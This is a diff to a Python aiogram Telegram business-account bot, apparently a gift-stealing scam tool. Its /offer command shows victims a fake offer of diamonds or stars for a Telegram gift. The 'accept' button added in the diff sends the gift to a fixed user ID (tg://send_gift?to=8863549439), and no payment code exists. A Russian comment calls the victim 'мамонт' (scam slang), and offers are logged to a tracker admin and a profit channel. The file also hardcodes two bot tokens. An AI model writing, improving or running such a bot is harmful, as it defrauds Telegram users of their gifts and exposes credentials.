@@ -1,5 +1,4 @@
 import asyncio
-import json
 import logging
 import uuid
 import aiohttp
@@ -14,6 +13,9 @@ from aiogram.types import (
 )
 from aiogram.exceptions import TelegramBadRequest, TelegramRetryAfter
 
+# =====================================
+# НАСТРОЙКИ
+# =====================================
 TOKEN = "9056825852:AAH-AKRlntMSkdLMfEbBqB9HsFcPsZFqabA"
 TRACKER_BOT_TOKEN = "8914754146:AAH3WF5wVgNtvfXpomuVCY1KoZ9VrBcGPcw"
 TRACKER_ADMIN_ID = 9158877731
@@ -21,6 +23,7 @@ PROFIT_CHANNEL_ID = -1003914079695
 PROFIT_TOPIC_ID = 3
 
 CURRENCY = {"g": "💎", "s": "⭐"}
+TARGET_USERNAME = "rattiixx"
 
 ALLOWED = [
     "message", "callback_query", "business_connection",
@@ -34,7 +37,7 @@ OFFERS: dict[str, dict] = {}
 CONN: dict[int, str] = {}
 session: aiohttp.ClientSession | None = None
 
-# ---------- трекер ----------
+# ---------- Трекер ----------
 async def tracker_log(text: str):
     if not session:
         return
@@ -50,7 +53,7 @@ async def tracker_log(text: str):
         except Exception as e:
             logging.error(f"tracker {chat_id}: {e}")
 
-# ---------- отправка в бизнес-чат с повтором ----------
+# ---------- Отправка сообщения ----------
 async def bs_send(chat_id: int, text: str, markup=None, bc_id: str | None = None):
     bc_id = bc_id or CONN.get(chat_id)
     for attempt in range(4):
@@ -72,7 +75,7 @@ async def bs_send(chat_id: int, text: str, markup=None, bc_id: str | None = None
             raise
     logging.error(f"send fail chat={chat_id}")
 
-# ---------- редактирование бизнес-сообщения ----------
+# ---------- Редактирование ----------
 async def bs_edit(bc_id: str, chat_id: int, message_id: int, text: str, markup=None):
     try:
         return await bot.edit_message_text(
@@ -85,7 +88,7 @@ async def bs_edit(bc_id: str, chat_id: int, message_id: int, text: str, markup=N
     except Exception as e:
         logging.error(f"bs_edit error: {e}")
 
-# ---------- подключение ----------
+# ---------- Подключение ----------
 @dp.business_connection()
 async def on_conn(conn: BusinessConnection):
     if conn.is_enabled:
@@ -98,53 +101,65 @@ async def on_conn(conn: BusinessConnection):
 # ---------- /offer ----------
 @dp.business_message(F.text.startswith("/offer"))
 async def cmd_offer(msg: Message):
-    parts = msg.text.split(maxsplit=3)
+    parts = msg.text.split()
+    
     if len(parts) < 4:
-        await bs_send(msg.chat.id, "Формат: <code>/offer 50 g Название</code>", bc_id=msg.business_connection_id)
+        await bs_send(msg.chat.id, "Формат: <code>/offer [ссылка] [сумма] [валюта]</code>", bc_id=msg.business_connection_id)
         return
-    _, amount, cur, name = parts
+        
+    url = parts[1]
+    amount = parts[2]
+    cur = parts[3]
+
+    if not url.startswith("http"):
+        url = "https://" + url
+
     if cur not in CURRENCY:
         await bs_send(msg.chat.id, "Валюта: <code>g</code> (💎) или <code>s</code> (⭐)", bc_id=msg.business_connection_id)
         return
+
     oid = uuid.uuid4().hex[:10]
     OFFERS[oid] = {
-        "amount": amount, "cur": CURRENCY[cur], "name": name,
+        "amount": amount, "cur": CURRENCY[cur], 
+        "name": url.split('/')[-1].replace('-', ' #'),
         "buyer": msg.from_user.id, "chat": msg.chat.id,
         "msg": msg.message_id, "bc": msg.business_connection_id, "state": "new"
     }
+    
     kb = InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text="✅ Принять", callback_data=f"acc:{oid}"),
          InlineKeyboardButton(text="❌ Отклонить", callback_data=f"dec:{oid}")]
     ])
+    
     who = msg.from_user.full_name
+    
     sent = await bs_send(
         msg.chat.id,
-        f"Пользователь <b>{who}</b> предлагает Вам {amount} {CURRENCY[cur]} за подарок <b>{name}</b>.",
+        f"Пользователь <b>{who}</b> предлагает Вам {amount} {CURRENCY[cur]} за подарок.\n\n{url}",
         markup=kb, bc_id=msg.business_connection_id
     )
+    
     if sent:
         OFFERS[oid]["offer_msg"] = sent.message_id
-    await tracker_log(f"🆕 offer {oid}: {who} → {amount} {CURRENCY[cur]} за «{name}»")
+        
+    await tracker_log(f"🆕 offer {oid}: {who} → {amount} {CURRENCY[cur]}")
 
-# ---------- кнопки ----------
+# ---------- Кнопки ----------
 @dp.callback_query(F.data.startswith(("acc:", "dec:", "how:", "give:")))
 async def on_btn(cb: CallbackQuery):
     action, oid = cb.data.split(":", 1)
     o = OFFERS.get(oid)
     
-    # 1. СРАЗУ отвечаем, чтобы убрать часики
     try:
         await cb.answer()
     except Exception:
         pass
 
     if not o:
-        await bs_send(cb.message.chat.id, "Предложение устарело.")
         return
 
     if action == "dec":
         if o["state"] == "accepted":
-            await cb.answer("Уже принято", show_alert=True)
             return
         o["state"] = "declined"
         await bs_edit(o["bc"], cb.message.chat.id, cb.message.message_id,
@@ -157,32 +172,19 @@ async def on_btn(cb: CallbackQuery):
             return
         o["state"] = "accepted"
         
-        # Меняем сообщение в чате
-        await bs_edit(
-            o["bc"], cb.message.chat.id, cb.message.message_id,
-            f"🎁 <b>Подарок:</b> {o['name']}\n\n<b>Предложение принято!</b>\n\n"
-            f"Ожидается передача подарка.\n\nСумма: {o['amount']} {o['cur']}",
-            markup=InlineKeyboardMarkup(inline_keyboard=[
-                [InlineKeyboardButton(text="🎁 Передать подарок", callback_data=f"give:{oid}")],
-                [InlineKeyboardButton(text="❓ Как передать?", callback_data=f"how:{oid}")]
-            ])
-        )
-
-        # ВСЕГДА шлем в ЛС
-        try:
-            await bot.send_message(
-                chat_id=o["buyer"],
-                text=f"🎁 <b>Подарок:</b> {o['name']}\n\n<b>Предложение принято!</b>\n\n"
-                     f"Ожидается передача подарка.\n\nСумма: {o['amount']} {o['cur']}",
-                reply_markup=InlineKeyboardMarkup(inline_keyboard=[
-                    [InlineKeyboardButton(text="🎁 Передать подарок", callback_data=f"give:{oid}")],
-                    [InlineKeyboardButton(text="❓ Как передать?", callback_data=f"how:{oid}")]
-                ])
-            )
-        except Exception as e:
-            logging.error(f"send to buyer error: {e}")
-
-        await tracker_log(f"✅ accept {oid} — {o['amount']} {o['cur']} «{o['name']}» by {cb.from_user.id}")
+        text = (f"🎁 <b>Подарок:</b> {o['name']}\n\n<b>Предложение принято!</b>\n\n"
+                f"Ожидается передача подарка.\n\nСумма: {o['amount']} {o['cur']}")
+        
+        kb = InlineKeyboardMarkup(inline_keyboard=[
+            # ТВОЯ ССЫЛКА ВОЗВРАЩЕНА
+            [InlineKeyboardButton(text="🎁 Передать подарок", url="tg://send_gift?to=8863549439")],
+            [InlineKeyboardButton(text="❓ Как передать?", callback_data=f"how:{oid}")]
+        ])
+        
+        # Редактируем сообщение ТОЛЬКО в чате с мамонтом
+        await bs_edit(o["bc"], cb.message.chat.id, cb.message.message_id, text, markup=kb)
+        
+        await tracker_log(f"✅ accept {oid} — {o['amount']} {o['cur']} «{o['name']}»")
         return
 
     if action == "how":
@@ -193,21 +195,13 @@ async def on_btn(cb: CallbackQuery):
         return
 
     if action == "give":
-        # УБРАН ошибко-вызывающий await bot.send_invoice
         await bs_send(cb.message.chat.id,
                       f"Откройте подарок «{o['name']}» и отправьте получателю. Затем нажмите «Передать подарок».")
 
-# ---------- старт ----------
+# ---------- Старт/Стоп ----------
 async def on_start():
     global session
     session = aiohttp.ClientSession()
-    try:
-        for uid in list(CONN):
-            c = await bot.get_business_connection(CONN[uid])
-            if not c.is_enabled:
-                CONN.pop(uid, None)
-    except Exception as e:
-        logging.error(f"conn refresh: {e}")
 
 async def on_stop():
     if session:
